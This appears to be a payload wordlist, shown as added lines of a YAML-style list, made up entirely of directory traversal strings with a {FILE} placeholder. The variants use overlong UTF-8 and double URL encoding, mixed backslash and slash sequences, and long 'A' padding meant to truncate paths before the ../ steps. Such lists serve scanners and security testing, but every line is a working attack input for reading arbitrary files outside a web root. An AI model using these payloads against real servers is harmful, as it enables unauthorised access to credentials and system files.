+- '%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\{FILE}'
+- '%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\{FILE}'
+- '%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\{FILE}'
+- '%25c0%25ae%25c0%25ae%25c1%259c{FILE}'
+- '%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c{FILE}'
+- '%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c{FILE}'
+- '%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c{FILE}'
+- '%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c{FILE}'
+- '%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c{FILE}'
+- '%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c{FILE}'
+- '%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c{FILE}'
+- ..%%32%66{FILE}
+- ..%%32%66..%%32%66{FILE}
+- ..%%32%66..%%32%66..%%32%66{FILE}
+- ..%%32%66..%%32%66..%%32%66..%%32%66{FILE}
+- ..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66{FILE}
+- ..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66{FILE}
+- ..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66{FILE}
+- ..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66{FILE}
+- '%%32%65%%32%65/{FILE}'
+- '%%32%65%%32%65/%%32%65%%32%65/{FILE}'
+- '%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/{FILE}'
+- '%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/{FILE}'
+- '%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/{FILE}'
+- '%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/{FILE}'
+- '%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/{FILE}'
+- '%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/{FILE}'
+- '%%32%65%%32%65%%32%66{FILE}'
+- '%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66{FILE}'
+- '%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66{FILE}'
+- '%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66{FILE}'
+- '%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66{FILE}'
+- '%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66{FILE}'
+- '%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66{FILE}'
+- '%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66{FILE}'
+- ..%%35%63{FILE}
+- ..%%35%63..%%35%63{FILE}
+- ..%%35%63..%%35%63..%%35%63{FILE}
+- ..%%35%63..%%35%63..%%35%63..%%35%63{FILE}
+- ..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63{FILE}
+- ..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63{FILE}
+- ..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63{FILE}
+- ..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63{FILE}
+- '%%32%65%%32%65%%35%63{FILE}'
+- '%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63{FILE}'
+- '%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63{FILE}'
+- '%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63{FILE}'
+- '%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63{FILE}'
+- '%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63{FILE}'
+- '%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63{FILE}'
+- '%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63{FILE}'
+- ..%5c{FILE}
+- \../{FILE}
+- \../\../{FILE}
+- \../\../\../{FILE}
+- \../\../\../\../{FILE}
+- \../\../\../\../\../{FILE}
+- \../\../\../\../\../\../{FILE}
+- \../\../\../\../\../\../\../{FILE}
+- \../\../\../\../\../\../\../\../{FILE}
+- /..\{FILE}
+- /..\/..\{FILE}
+- /..\/..\/..\{FILE}
+- /..\/..\/..\/..\{FILE}
+- /..\/..\/..\/..\/..\{FILE}
+- /..\/..\/..\/..\/..\/..\{FILE}
+- /..\/..\/..\/..\/..\/..\/..\{FILE}
+- /..\/..\/..\/..\/..\/..\/..\/..\{FILE}
+- AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../{FILE}
+- AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../{FILE}
+- AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../{FILE}
+- AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../{FILE}
+- AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../{FILE}
+- AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../../{FILE}
+- AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../../../{FILE}
+- AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../../../../{FILE}
+- AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\..\{FILE}
+- AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\..\..\{FILE}
+- AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA